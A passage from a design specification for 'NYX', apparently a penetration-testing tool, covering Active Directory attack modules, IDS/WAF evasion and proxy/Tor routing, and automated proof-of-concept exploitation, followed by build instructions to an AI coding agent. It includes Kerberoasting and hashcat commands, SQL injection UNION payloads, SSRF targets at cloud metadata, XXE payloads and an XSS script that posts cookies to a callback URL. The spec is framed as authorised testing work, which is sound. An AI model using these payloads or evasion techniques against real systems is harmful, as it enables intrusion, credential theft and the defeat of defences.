    }
    for _, target := range session.InScope {
        for _, private := range privateRanges {
            if ipRangeOverlaps(target, private) {
                return true
            }
        }
    }
    return false
}
```

When internal scope is detected, the AD/Internal module phases activate automatically.

### New scan phases

```go
const PhaseInternalRecon  Phase = "internal_recon"    // runs in parallel with recon
const PhaseADEnumeration  Phase = "ad_enumeration"    // runs after internal_recon
const PhaseADAttack       Phase = "ad_attack"         // runs after ad_enumeration
```

### New package: `internal/activedirectory/`

```
internal/activedirectory/
├── engine.go            # orchestrates AD phases
├── ldap.go              # LDAP enumeration
├── smb.go               # SMB enumeration (shares, null sessions)
├── kerberos.go          # Kerberoasting, AS-REP roasting
├── bloodhound.go        # BloodHound integration
├── relay.go             # LLMNR/NBT-NS relay opportunity detection
├── hashcat.go           # hashcat integration for cracking
└── netexec.go           # NetExec (nxc) wrapper
```

### LDAP enumeration

```go
type LDAPEnumerator struct {
    target string
    port   int  // 389 or 636
    conn   *ldap.Conn
}

func (l *LDAPEnumerator) Enumerate(ctx context.Context) (LDAPData, error) {
    // Anonymous bind attempt first, then authenticated if credentials available
    // Query:
    //   - Domain naming context (base DN)
    //   - All user objects: sAMAccountName, mail, memberOf, lastLogon, pwdLastSet
    //   - All computer objects: name, operatingSystem, operatingSystemVersion
    //   - All group objects: name, member
    //   - Password policy: minPwdLength, lockoutThreshold, lockoutDuration
    //   - Domain trusts: trustPartner, trustType, trustDirection
    //   - Service accounts (SPNs set): servicePrincipalName attribute
    //   - Kerberoastable accounts (SPN set + not krbtgt)
    //   - AS-REP roastable accounts (DONT_REQUIRE_PREAUTH flag set)
    //   - AdminCount=1 accounts (protected users)
    //   - Domain admins group members
    //   - Unconstrained delegation accounts
    //   - LAPS enabled computers
}

type LDAPData struct {
    DomainName      string
    DomainSID       string
    PasswordPolicy  PasswordPolicy
    Users           []ADUser
    Computers       []ADComputer
    Groups          []ADGroup
    Trusts          []DomainTrust
    SPNAccounts     []ADUser    // Kerberoastable
    ASREPAccounts   []ADUser    // AS-REP roastable
}
```

Store all LDAP data as a mix of `SourceFinding` records (kind = "ad_user", "ad_computer", "ad_group") and `Finding` records for high-value targets (Domain Admins, unconstrained delegation, etc.).

### SMB enumeration

```go
func (s *SMBEnumerator) Enumerate(ctx context.Context, target string) (SMBData, error) {
    // 1. Null session test: attempt unauthenticated SMB connection
    //    Finding: severity=high if null sessions allowed
    //
    // 2. Share enumeration: list all shares
    //    Flag shares readable anonymously: severity=high
    //    Flag shares containing sensitive names: SYSVOL, NETLOGON, admin$, C$
    //
    // 3. SMB signing check: detect if signing is required or optional
    //    Finding: severity=medium if signing not required (relay opportunity)
    //
    // 4. SMB version detection: SMBv1 enabled = severity=high
    //
    // 5. If credentials available from credential testing module:
    //    Mount readable shares, search for interesting files:
    //    *.config, *.xml with passwords, *.kdbx, unattend.xml, web.config
}
```

### Kerberoasting

```go
func (k *KerberosAttacker) Kerberoast(ctx context.Context, domain, username, password string, targets []ADUser) ([]KerberoastResult, error) {
    // For each account with SPN set:
    //   Request TGS ticket using the authenticated user's credentials
    //   Extract the encrypted portion (crackable offline)
    //   Store the hash in $krb5tgs$23$<hash> format for hashcat
    //
    // Immediately pipe to hashcat if available (see hashcat.go):
    //   hashcat -a 0 -m 13100 hashes.txt /path/to/wordlist
    //
    // Store results in credential_findings table:
    //   credential_type="kerberoast_hash"
    //   value=<hash>
    //   valid=false (until hashcat cracks it)
    //   If cracked: valid=true, password=<plaintext>
}

func (k *KerberosAttacker) ASREPRoast(ctx context.Context, domain string, targets []ADUser) ([]ASREPResult, error) {
    // For accounts with DONT_REQUIRE_PREAUTH set:
    //   Request AS-REP without pre-authentication
    //   Extract crackable hash in $krb5asrep$23$<hash> format
    //   Pipe to hashcat -m 18200
}
```

### BloodHound integration

```go
type BloodHoundIntegration struct {
    // Two modes:
    // 1. Run SharpHound/BloodHound.py collector, import JSON output
    // 2. Query existing BloodHound database via REST API (BloodHound CE)
}

func (b *BloodHoundIntegration) CollectData(ctx context.Context, domain, username, password string) ([]BloodHoundJSON, error) {
    // Spawn bloodhound-python as subprocess:
    // bloodhound-python -d <domain> -u <username> -p <password> -c All --zip
    // Parse the output ZIP containing JSON files
}

func (b *BloodHoundIntegration) FindAttackPaths(ctx context.Context, data []BloodHoundJSON) ([]ADAttackPath, error) {
    // Load data into an in-memory graph (gonum/graph)
    // Find shortest paths to:
    //   - Domain Admin group
    //   - Enterprise Admin group
    //   - Domain Controllers
    // Paths use BloodHound edge types:
    //   MemberOf, GenericAll, GenericWrite, WriteDacl, Owns,
    //   DCSync, GetChangesAll, ForceChangePassword, etc.
    //
    // Each path → AttackVector record in the session DB
    // Steps = BloodHound path edges in order
}
```

### LLMNR/NBT-NS relay detection

```go
func (r *RelayDetector) DetectRelayOpportunities(ctx context.Context, subnet string) ([]RelayOpportunity, error) {
    // Passive detection only — listen on the network for LLMNR and NBT-NS queries
    // for a configurable duration (default 60 seconds)
    //
    // If LLMNR queries detected: finding severity=high
    //   "LLMNR enabled on subnet — relay attack possible"
    //   Provide exact responder command to run
    //
    // If SMB signing not required (from SMB enumeration):
    //   "SMB relay attack possible — signing not enforced"
    //   Provide exact ntlmrelayx command
    //
    // These are DETECTION findings, not active attacks
    // Active relay attacks require manual execution
}
```

### NetExec integration

```go
// NetExec (nxc) wrapper for protocol testing with found credentials
func (n *NetExecWrapper) TestCredentials(ctx context.Context, cred CredentialFinding, targets []models.Target) []NetExecResult {
    // nxc smb <target_range> -u <user> -p <password>
    // nxc winrm <target_range> -u <user> -p <password>
    // nxc ssh <target_range> -u <user> -p <password>
    // nxc rdp <target_range> -u <user> -p <password>
    //
    // Parses [+] SUCCESS lines
    // Each success → credential_finding with valid=true
    // [Pwn3d!] indicator → finding severity=critical "Local admin access confirmed"
}
```

### API endpoints

```
GET /api/sessions/{id}/ad/summary        AD enumeration summary
GET /api/sessions/{id}/ad/users          All AD users
GET /api/sessions/{id}/ad/computers      All AD computers
GET /api/sessions/{id}/ad/attack-paths   BloodHound-derived attack paths
GET /api/sessions/{id}/ad/hashes         Kerberoast/AS-REP hashes
GET /api/sessions/{id}/ad/relay          Relay opportunities
GET /api/sessions/{id}/smb               SMB enumeration results
```

### Web UI additions

Add an **Active Directory** tab to the session detail page (only visible when internal scope detected):

- Domain summary: name, SID, functional level, password policy
- User table: all domain users, filterable by admin/service account/kerberoastable/AS-REP roastable
- Attack path visualizer: graph showing BloodHound paths to Domain Admin (reuse Cytoscape.js)
- Hash status: list of captured hashes with crack status from hashcat
- Relay opportunities: list of detected opportunities with ready-to-use command strings
- SMB shares: table of shares with read/write access status

---

## Module 6: Evasion & Stealth Mode

### Overview

Makes NYX scans survivable against real defences. Adds adaptive rate limiting, traffic blending, proxy chain support, and WAF-aware scanning profiles. Activated with `--stealth` flag or configurable per-session.

### Evasion configuration

```go
type EvasionConfig struct {
    // Rate limiting
    GlobalRateLimit    int           // max requests/second across all tools
    PerHostRateLimit   int           // max requests/second per host
    AdaptiveRateLimit  bool          // automatically reduce rate on 429/block
    BackoffMultiplier  float64       // multiply delay by this on block (default: 2.0)
    MaxBackoffSeconds  int           // cap backoff at this value (default: 300)

    // Traffic blending
    RandomiseUserAgent bool          // rotate user agents
    RandomiseHeaders   bool          // inject realistic browser headers
    RequestJitter      time.Duration // random delay added to each request
    MimicBrowser       bool          // full browser header set (Accept, Accept-Language, etc.)

    // Proxy
    ProxyURL           string        // SOCKS5 or HTTP proxy URL
    ProxyRotate        []string      // list of proxies to rotate through
    TorEnabled         bool          // route through Tor (requires Tor running locally)

    // Scanning behaviour
    ScanProfile        string        // "aggressive" | "normal" | "stealth" | "paranoid"
    RandomiseOrder     bool          // randomise order of hosts and ports scanned
    FragmentRequests   bool          // fragment large requests to avoid signature matching
    DecoyTraffic       bool          // mix in benign requests to blend with real traffic
}
```

### Stealth profiles

| Profile | Requests/sec | Jitter | User Agent | Notes |
|---|---|---|---|---|
| aggressive | 100 | none | nyx/1.0 | Existing default behaviour |
| normal | 20 | 100–500ms | rotated | Good balance |
| stealth | 5 | 500ms–3s | full browser | Slow but survivable |
| paranoid | 1 | 3–10s | full browser | Very slow, maximum evasion |

### Adaptive rate limiter

```go
type AdaptiveRateLimiter struct {
    baseRate      rate.Limiter
    currentRate   float64
    blockCount    map[string]int    // per-host block detection count
    mu            sync.Mutex
}

func (a *AdaptiveRateLimiter) RecordResponse(host string, statusCode int, responseBody string) {
    // Detect blocks:
    //   429 Too Many Requests → definite rate limit
    //   403 with WAF body patterns → WAF block
    //   Connection reset/timeout cluster → IDS block
    //   Empty response after N requests → possible blacklisting
    //
    // On block detection:
    //   Increment block count for host
    //   Multiply delay by BackoffMultiplier
    //   Log block event as ScanEvent over WebSocket
    //   After backoff period: resume at reduced rate
    //   If blocks persist: mark host as "rate limited" in DB, skip remaining tests
}
```

### User agent and header rotation

```go
var BrowserProfiles = []BrowserProfile{
    {
        UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        AcceptLanguage: "en-US,en;q=0.9",
        AcceptEncoding: "gzip, deflate, br",
        SecChUa: `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`,
        SecChUaMobile: "?0",
        SecChUaPlatform: `"Windows"`,
    },
    // Safari/macOS, Firefox/Linux, Edge/Windows profiles...
}
```

### Proxy chain support

```go
type ProxyChain struct {
    proxies []string
    current int
    mu      sync.Mutex
}

func (p *ProxyChain) NextProxy() string {
    p.mu.Lock()
    defer p.mu.Unlock()
    proxy := p.proxies[p.current % len(p.proxies)]
    p.current++
    return proxy
}

// Configure all HTTP clients in all tool adapters to route through the proxy chain
// Tools that spawn subprocesses: pass proxy via environment variables
// (HTTP_PROXY, HTTPS_PROXY, ALL_PROXY) before exec.Command
```

### WAF-aware scanning profiles

When a WAF is detected (from the fingerprint phase), automatically switch to a WAF-specific scanning profile that avoids known signature patterns:

```go
var WAFScanningProfiles = map[string]ScanProfile{
    "cloudflare": {
        NucleiTemplateExclusions: []string{"sqli-error-based", "xss-reflected-raw"},
        RequestDelay:             500 * time.Millisecond,
        PayloadEncoding:          "unicode",
        UserAgentMimicBrowser:    true,
    },
    "aws-waf": {
        RequestDelay:             200 * time.Millisecond,
        PayloadEncoding:          "double-url",
    },
    // ... per WAF profiles
}
```

### Block detection log

Store block events in a new table to understand target defences:

```sql
CREATE TABLE block_events (
    id          TEXT PRIMARY KEY,
    session_id  TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    target_id   TEXT REFERENCES targets(id),
    blocked_at  DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    block_type  TEXT NOT NULL,
    -- 'rate_limit' | 'waf_block' | 'ids_block' | 'blacklist'
    evidence    TEXT NOT NULL DEFAULT '',
    -- response that indicated the block
    recovered   BOOLEAN NOT NULL DEFAULT FALSE,
    recovery_at DATETIME
);
```

### CLI additions

```
nyx scan --target example.com --stealth
nyx scan --target example.com --profile paranoid
nyx scan --target example.com --proxy socks5://127.0.0.1:9050
nyx scan --target example.com --proxy-list proxies.txt
nyx scan --target example.com --rate-limit 5
nyx scan --target example.com --jitter 2s
```

### Web UI additions

Add **Evasion** panel to the scan progress page:

- Current scan profile and active rate limit
- Block events timeline: which hosts blocked and when, recovery status
- Proxy status: which proxy is active, request count per proxy
- WAF detections: detected WAFs per host, active bypass profile
- Rate limiting graph: requests/second over time (Recharts line chart)

---

## Module 7: Automated PoC & Impact Demonstration

### Overview

When a vulnerability is confirmed, NYX attempts safe automated exploitation to capture proof of impact. Never performs destructive actions, never exfiltrates real data beyond a canary value, always scope-checked. The goal is evidence that can go directly into a pentest report: "we confirmed this vulnerability by doing X and observed Y."

### Canary infrastructure

NYX runs a built-in canary server when `nyx serve` is active. This is a simple HTTP server on a random high port that:
- Accepts any HTTP request and logs it
- Generates unique per-finding canary URLs (`http://localhost:<port>/canary/<finding-id>/<random-token>`)
- Used as the callback target for SSRF, XSS, and XXE PoCs
- For external engagements: integrates with Interactsh as an alternative

```go
type CanaryServer struct {
    port      int
    callbacks chan CanaryCallback
    tokens    map[string]string  // token → finding ID
}

type CanaryCallback struct {
    FindingID   string
    ReceivedAt  time.Time
    SourceIP    string
    Method      string
    Headers     map[string]string
    Body        string
}
```

For external engagements where the target can't reach localhost, use Interactsh:

```go
type InteractshClient struct {
    serverURL  string  // https://interactsh.com or self-hosted
    token      string
    correlator map[string]string  // interactsh subdomain → finding ID
}
```

### PoC execution per vulnerability type

**SQL Injection PoC:**
```go
func (p *SQLiPoC) Execute(ctx context.Context, finding models.Finding) (PoCResult, error) {
    // Attempt safe read-only queries:
    //   MySQL:  ' UNION SELECT 1,@@version,3-- -
    //   MSSQL:  ' UNION SELECT 1,@@version,3-- -
    //   PostgreSQL: ' UNION SELECT 1,version(),3-- -
    //   Oracle: ' UNION SELECT 1,v$version,3 FROM v$version-- -
    //
    // If version extracted: store as evidence
    // Attempt table count: ' UNION SELECT 1,count(*),3 FROM information_schema.tables-- -
    // Never attempt: DROP, DELETE, UPDATE, INSERT
    // Never dump actual user data beyond column names
    //
    // Evidence stored: DB type, version string, table count, column names from one table
}
```

**XSS PoC:**
```go
func (p *XSSPoC) Execute(ctx context.Context, finding models.Finding) (PoCResult, error) {
    // Generate payload that POSTs document.cookie and document.location to canary:
    // <script>
    //   fetch('http://<canary-url>', {
    //     method: 'POST',
    //     body: JSON.stringify({
    //       url: document.location.href,
    //       cookies: document.cookie,
    //       token: '<finding-id>'
    //     })
    //   })
    // </script>
    //
    // Send request with this payload
    // Wait up to 10 seconds for canary callback
    // If callback received: store source IP, cookies received (masked), URL
    // Evidence: proof of JavaScript execution with captured browser context
}
```

**SSRF PoC:**
```go
func (p *SSRFPoC) Execute(ctx context.Context, finding models.Finding) (PoCResult, error) {
    // Attempt in order:
    //   1. Cloud metadata: http://169.254.169.254/latest/meta-data/ (AWS)
    //                      http://metadata.google.internal/computeMetadata/v1/ (GCP)
    //                      http://169.254.169.254/metadata/instance (Azure)
    //   2. Canary URL: confirm out-of-band callback received
    //   3. Internal RFC1918 host: attempt to reach 192.168.1.1 or 10.0.0.1
    //
    // If metadata API responds: store IAM role name (NOT credentials), instance type, region
    // If canary callback received: store source IP (confirms server-side request)
    // Never attempt: reading IAM credentials, instance user-data with sensitive info
}
```

**SSTI PoC:**
```go
func (p *SSTIPoC) Execute(ctx context.Context, finding models.Finding) (PoCResult, error) {
    // Attempt math evaluation proof — different per engine:
    //   Jinja2/Twig: {{7*7}} → expects "49" in response
    //   Freemarker:  ${7*7}  → expects "49"
    //   Smarty:      {7*7}   → expects "49"
    //   Pebble:      {{7*7}} → expects "49"
    //
    // If math evaluates: store detected template engine, evaluation proof
    // Do NOT attempt RCE commands — only math evaluation
}
```

**Open redirect PoC:**
```go
func (p *OpenRedirectPoC) Execute(ctx context.Context, finding models.Finding) (PoCResult, error) {
    // Substitute the redirect parameter with the canary URL
    // Send request and check if response redirects to canary
    // If redirect confirmed: check if canary receives the request
    // Evidence: the redirect chain, final destination URL
}
```

**XXE PoC:**
```go
func (p *XXEPoC) Execute(ctx context.Context, finding models.Finding) (PoCResult, error) {
    // Blind XXE via canary:
    // <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<canary-url>/xxe-<finding-id>"> ]>
    // <element>&xxe;</element>
    //
    // Send to XML-accepting endpoint
    // Wait for canary callback
    // If callback received: confirms XXE execution
    // Do NOT attempt: file read (etc/passwd), SSRF to internal hosts via XXE
    //   (too destructive for automated execution — leave for manual follow-up)
}
```

### New database table: `poc_results`

```sql
CREATE TABLE poc_results (
    id              TEXT PRIMARY KEY,
    finding_id      TEXT NOT NULL REFERENCES findings(id) ON DELETE CASCADE,
    session_id      TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    poc_type        TEXT NOT NULL,
    -- 'sqli' | 'xss' | 'ssrf' | 'ssti' | 'xxe' | 'open_redirect'
    success         BOOLEAN NOT NULL DEFAULT FALSE,
    evidence_type   TEXT NOT NULL DEFAULT '',
    -- what was captured: 'db_version' | 'cookie_captured' | 'metadata_response' |
    --                    'canary_callback' | 'template_evaluated'
    evidence_value  TEXT NOT NULL DEFAULT '',
    -- the actual captured value (sanitised — no real credentials)
    raw_request     TEXT NOT NULL DEFAULT '',
    raw_response    TEXT NOT NULL DEFAULT '',
    canary_callback TEXT NOT NULL DEFAULT '',
    -- captured canary request if applicable
    executed_at     DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);
```

### LLM impact narrative using PoC evidence

After PoC execution, pass the captured evidence to LLM Pass 3 (narrative) with enhanced context:

> "SQL injection confirmed at /api/search. PoC extracted: MySQL 8.0.26, database name 'customer_db', 47 tables including 'users', 'payment_cards', 'sessions'. Write a specific impact statement for a pentest report."

This produces dramatically better narratives than generic descriptions.

### API endpoints

```
POST /api/sessions/{id}/findings/{findingId}/poc/run
    Trigger PoC execution for a specific finding

GET  /api/sessions/{id}/findings/{findingId}/poc
    Get PoC result for a finding

GET  /api/sessions/{id}/poc/results
    All PoC results for session

GET  /api/sessions/{id}/poc/canary/callbacks
    All canary callbacks received during session
```

### Web UI additions

In the finding detail panel, add a **Proof of Concept** section:

- "Run PoC" button (disabled for finding types without safe PoC)
- PoC status: pending / running / succeeded / failed
- Evidence display: DB version captured, cookie value (masked), metadata response, canary callback details
- Raw HTTP request used for the PoC (copyable)
- Warning banner: "PoC execution makes active requests to the target — ensure this is within scope and authorisation"

---

## Module 8: Burp Suite Bridge

### Overview

Two-way integration between NYX and Burp Suite. Import discovered endpoints and issues from Burp, export NYX-discovered attack surface to Burp's scope, and use Burp Collaborator or Interactsh as the out-of-band callback server for SSRF and blind injection tests.

### Integration modes

**Mode A: File-based (no Burp running required)**
- Import Burp XML project exports
- Export NYX scope as Burp target scope XML
- Import Burp scanner issues as NYX findings

**Mode B: Burp REST API (Burp Suite Pro running locally)**
- Burp Pro exposes a REST API on `http://127.0.0.1:1337`
- Real-time bidirectional sync
- Push endpoints to Burp's active scanner
- Pull live scanner results into NYX

### New package: `internal/burp/`

```
internal/burp/
├── client.go          # Burp REST API client
├── importer.go        # import Burp XML export
├── exporter.go        # export NYX data to Burp format
├── collaborator.go    # Burp Collaborator / Interactsh client
└── xml/
    ├── project.go     # Burp project XML parser
    └── scope.go       # Burp scope XML generator
```

### Burp XML import

```go
type BurpXMLImporter struct{}

func (b *BurpXMLImporter) Import(ctx context.Context, xmlPath string, sessionID string) (ImportResult, error) {
    // Parse Burp XML project file
    // Extract:
    //   items[].request → add to session as discovered endpoints (SourceFinding kind="route")
    //   items[].response → store HTTP evidence
    //   issues[].name, severity, detail → create Finding records
    //     Map Burp severity: High→high, Medium→medium, Low→low, Information→info
    //   host entries → create Target records
    //
    // Deduplicate: don't import findings that match existing NYX findings
    // (match on URL + finding type)
}
```

**Burp issue severity mapping:**

| Burp Severity | NYX Severity |
|---|---|
| High | high |
| Medium | medium |
| Low | low |
| Information | info |
| Burp confidence: Certain | confidence=0.95 |
| Burp confidence: Firm | confidence=0.75 |
| Burp confidence: Tentative | confidence=0.45 |

### Burp REST API client

```go
type BurpAPIClient struct {
    baseURL string  // default: http://127.0.0.1:1337
    apiKey  string  // Burp Pro API key
}

// Push discovered endpoints to Burp's scope and active scanner
func (c *BurpAPIClient) AddToScope(ctx context.Context, urls []string) error {
    // PUT /v0.1/target/scope
    // Body: {"include": [{"rule": url}]}
}

// Push a specific URL to Burp's active scanner
func (c *BurpAPIClient) ScanURL(ctx context.Context, url string, params []string) (string, error) {
    // POST /v0.1/scan
    // Returns scan ID
}

// Pull scan results from Burp
func (c *BurpAPIClient) GetScanResults(ctx context.Context, scanID string) ([]BurpIssue, error) {
    // GET /v0.1/scan/{scanID}
    // Parse issues, convert to NYX Finding records
}

// Pull all issues from the current Burp project
func (c *BurpAPIClient) GetAllIssues(ctx context.Context) ([]BurpIssue, error) {
    // GET /v0.1/issue-definitions
    // GET /v0.1/target/issues
}
```

### Scope export

Export NYX session targets as Burp scope XML for import into Burp:

```go
func (e *BurpExporter) ExportScope(session models.Session, targets []models.Target) ([]byte, error) {
    // Generate Burp Suite target scope XML:
    // <TargetConfig>
    //   <scope>
    //     <item>
    //       <enabled>true</enabled>
    //       <host>target.com</host>
    //       <protocol>https</protocol>
    //     </item>
    //   </scope>
    // </TargetConfig>
}
```

### Collaborator / Interactsh integration

Replace the built-in canary server with Burp Collaborator or Interactsh for external engagements:

```go
type CollaboratorConfig struct {
    Provider   string  // "builtin" | "burp" | "interactsh"
    BurpPollingURL string  // Burp Collaborator polling URL
    InteractshURL  string  // self-hosted or interactsh.com
    InteractshToken string
}

func (c *CollaboratorClient) GeneratePayloadURL(findingID string) string {
    // Returns a unique URL that, when fetched, records a callback
    // Burp: <unique>.burpcollaborator.net
    // Interactsh: <unique>.oast.pro (or self-hosted domain)
    // Built-in: http://localhost:<port>/canary/<finding-id>/<token>
}

func (c *CollaboratorClient) PollCallbacks(ctx context.Context) chan CanaryCallback {
    // Continuously poll for callbacks and send to channel
    // Correlate callback subdomain/token to finding ID
}
```

### API endpoints

```
POST /api/sessions/{id}/burp/import              Import Burp XML file (multipart upload)
GET  /api/sessions/{id}/burp/export/scope        Download session targets as Burp scope XML
GET  /api/sessions/{id}/burp/export/findings     Download NYX findings as Burp XML
POST /api/sessions/{id}/burp/push-scope          Push NYX targets to running Burp (REST API mode)
POST /api/sessions/{id}/burp/pull-issues         Pull Burp scanner issues into NYX session
GET  /api/sessions/{id}/burp/status              Check if Burp REST API is reachable
POST /api/burp/collaborator/setup                Configure collaborator/interactsh endpoint
GET  /api/burp/collaborator/callbacks            Recent canary/collaborator callbacks
```

### CLI additions

```
nyx burp import <burp-export.xml> --session <session-id>
nyx burp export scope <session-id> --output scope.xml
nyx burp export findings <session-id> --output findings.xml
nyx burp push-scope <session-id>           # requires Burp running
nyx burp pull-issues <session-id>          # requires Burp running
nyx burp collaborator set --provider interactsh --url https://interactsh.com
```

### Web UI additions

Add a **Burp** panel to the session detail page:

- Connection status: "Burp Suite Pro detected at localhost:1337" or "File import mode"
- Import section: drag-and-drop zone for Burp XML files, import progress, import summary
- Export section: "Download Burp Scope XML", "Download Burp Findings XML"
- Sync section (REST API mode): "Push X targets to Burp scope", "Pull issues from Burp"
- Collaborator section: active callback URL, recent callbacks list with timestamp and source IP

---

## Agent Instructions

Before implementing any code, ask the operator:

> "This document specifies 8 enhancement modules for NYX. Which would you like to implement?
>
> 1. AI Payload Generation
> 2. Continuous Attack Surface Monitoring
> 3. Credential Testing Module
> 4. OSINT Expansion Module
> 5. Active Directory & Internal Network Module
> 6. Evasion & Stealth Mode
> 7. Automated PoC & Impact Demonstration
> 8. Burp Suite Bridge
>
> You can select one, several, or all. For each selected module, I will produce an implementation plan before writing any code."

For each selected module, produce an implementation plan in this format:
1. New Go packages to create
2. Database migrations required
3. Changes to existing files (adapters, engine, API, UI)
4. New dependencies to add to go.mod
5. Estimated implementation order (what to build first within the module)
6. Integration points with other selected modules

Then implement the modules in dependency order:
- Evasion (Module 6) should be implemented before modules that make active requests
- OSINT (Module 4) should be implemented before Credential Testing (Module 3) if both selected
- Canary infrastructure (part of Module 7) should be implemented before Burp Collaborator (Module 8)
- AD Module (Module 5) is independent and can be implemented at any point

---

*End of NYX Power Features Specification — Version 1.0*
